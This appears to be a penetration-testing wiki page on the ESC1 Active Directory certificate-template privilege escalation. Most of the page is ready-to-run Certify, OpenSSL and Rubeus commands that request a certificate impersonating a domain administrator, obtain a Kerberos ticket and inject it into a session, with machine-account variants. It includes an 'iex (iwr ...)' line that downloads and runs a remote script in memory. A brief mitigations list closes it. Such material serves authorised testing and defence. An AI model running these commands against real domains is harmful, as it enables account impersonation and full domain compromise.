# ESC1

## ESC1

### Description

ESC1 is a privilege escalation vulnerability in certificate templates that allows any user with enrollment rights to supply a subjectAltName (SAN) for any other user or machine in Active Directory in the environment from the Certificate Authority (CA) , this allows the requesting user to receive a certificate for the targeted user and in turn, authenticate as them with the received certificate.

## ESC 1 - Windows Abuse

**Tools Required**

* Certify
* Rubeus
* OpenSSL: [https://slproweb.com/download/Win64OpenSSL\_Light-3\_2\_1.msi](https://slproweb.com/download/Win64OpenSSL\_Light-3\_2\_1.msi)
* Access to a UNIX system if unable to install OpenSSL on the testing Windows host

### Requirements for attack path

* ENROLLEE\_SUPPLIES\_SUBJECT flag in the certificate template
* Enrollment rights granted to a user or group for which we have access to
* Manager approval not enabled
* Authorized signature are not required

### Enumerate vulnerable certificate templates for ESC1 

```powershell
Invoke-Certify find /enrolleeSuppliesSubject /currentuser
```

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

In the above image of a vulnerable certificate template we have

* CA Name
* Template Name
* msPKI-Certificate-Name-Flag - ENROLLEE\_SUPPLIES-SUBJECT
* Authorized Signatures Required - 0 (Not required)
* pkiextendedkeyusage - contains Client Authentication
* Enrollment rights for a principal we own or are a member of (Domain Users)

Given this information, it is possible to abuse the ESC1 attack vector. As our user is a member of Domain Users we can request a certificate for any other user, ideally,  a Domain Administrator.

{% code overflow="wrap" %}
```powershell
# Syntax
Invoke-Certify request /[CA Name] /template:[Template] /altname:[User to Impersonate]

# Example
Invoke-Certify request /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Copy the private key and certificate output into a file on a host where OpenSSL is installed.

{% tabs %}
{% tab title="Certificate.pem" %}
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvSMVrpG5BpRm8a0hfybpt7F5begLKJqXM69qRLMXO1De4QiW...
<---- Snip ---->
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFnjCCBIagAwIBAgITOwAAAARKx4M83Cq7HwAAAAAABDANBgkqhkiG9w0BAQsF
<---- Snip ---->
-----END CERTIFICATE-----
```
{% endtab %}
{% endtabs %}

Issue the following with OpenSSL

{% tabs %}
{% tab title="Windows" %}
{% code overflow="wrap" %}
```powershell
# Convert the certificate to PFX, optionally setting a password
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out certificate.pfx

# If Base64 encoding the certificate (Not required)
[System.Convert]::ToBase64String((Get-Content -Path ".\certificate.pem" -Encoding Byte)) | Write-Output
```
{% endcode %}
{% endtab %}

{% tab title="Unix" %}
{% code overflow="wrap" %}
```python
# Convert the certificate to PFX, optionally setting a password
openssl pkcs12 -in certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out certificate.pfx

# If Base64 encoding the certificate (Not required)
cat certificate.pfx | base64 -w 0
```
{% endcode %}
{% endtab %}
{% endtabs %}

Take either the Base64 output or certificate file path and use with Rubeus to requests a TGT of the target account.

{% tabs %}
{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax (if certificate password was specified)
Invoke-Rubeus -Command "asktgt /user:<DomainAdmin> /password:<password> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>"

# Syntax (certificate password not specified)
Invoke-Rubeus -Command "asktgt /user:<DomainAdmin> /certificate:<Base64-Cert> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>"
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax (if certificate password was specified)
Rubeus.exe asktgt /user:<DomainAdmin> /password:<password> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>

# Syntax (certificate password not specified)
Rubeus.exe asktgt /user:<DomainAdmin> /certificate:<Base64-Cert> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

With a TGT for the impersonated user  either pass the ticket directly into the current session, or use createnetonly to create a new  sacrificial logon session with the impersonated users ticket (preferred)

{% tabs %}
{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /username:<user> /password:fakepass /ptt /show /domain:<domain> /dc:<Domain Controller> /ticket:<ticket>"

# Example
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /username:arbiter /password:fakepass /ptt /show /domain:security.local /dc:dc01.security.local /ticket:doIGV<--Snip -->"
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /username:<user> /password:fakepass /ptt /show /domain:<domain> /dc:<Domain Controller> /ticket:<ticket>

# Example
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /username:arbiter /password:fakepass /ptt /show /domain:security.local /dc:dc01.security.local /ticket:doIGV<--Snip -->
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>



## &#x20;ESC1 - Windows  - Machine Account

Its not uncommon to find the ability for domain computers to have enrollment rights over templates.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

To perform this attack you will need to be running a shell in the context of a domain computer (SYSTEM or TGT in memory for a computer account, or if a local administrator certify will attempt to elevate to SYSTEM).

{% tabs %}
{% tab title="Invoke-Certify" %}
{% code overflow="wrap" %}
```powershell
Invoke-Certify request /machine /[CA Name] /template:[Template] /altname:[User to Impersonate]

# Example
Invoke-Certify request /machine /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter 
```
{% endcode %}
{% endtab %}

{% tab title="Certify" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Certify.exe request /machine /[CA Name] /template:[Template] /altname:[User to Impersonate]
</strong>
# Example
Certify.exe request /machine /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter 
</code></pre>
{% endtab %}
{% endtabs %}

Repeat the steps in the section "Windows Abuse" from the point of requesting the certificate to complete the attack path.





## ESC1 - Windows - Machine Account Quota

The above section "ESC1 - Machine Account" presents an overview for abusing the ESC1 vulnerable template by abusing local administrative or SYSTEM level privileges for the current system to leverage the vulnerability.\
\
Another way to leverage this vulnerability for when "Domain Computers" have enrollement rights is by adding a new system to Active Dirctory\
\
Powermad can be used to enumerate for and add a new machine account to the domain.

Powermad: [https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

{% code overflow="wrap" %}
```powershell
# Load Powermad into memory
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)

# Enumerate Machine Account Quota
New-MachineAccount -MachineAccount <ComputerName>

# New logon session as the machine account
runas.exe /user:security.local\EvilComputer$

# Run Certify (Without the /machine flag)
Invoke-Certify request /[CA Name] /template:[Template] /altname:[User to Impersonate]
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Repeat the steps in the section "Windows Abuse" from the point of requesting the certificate to complete the attack path.





## Mitigations

* Remove the ENROLEE\_SUPPLIES\_SUBJECT flag from the certificate template
* Ensure Manager approval is required on the certificate
* Require authorized signatures
* If possible, remove Enrollment rights for low privileges groups such as Domain users and Domain Computers
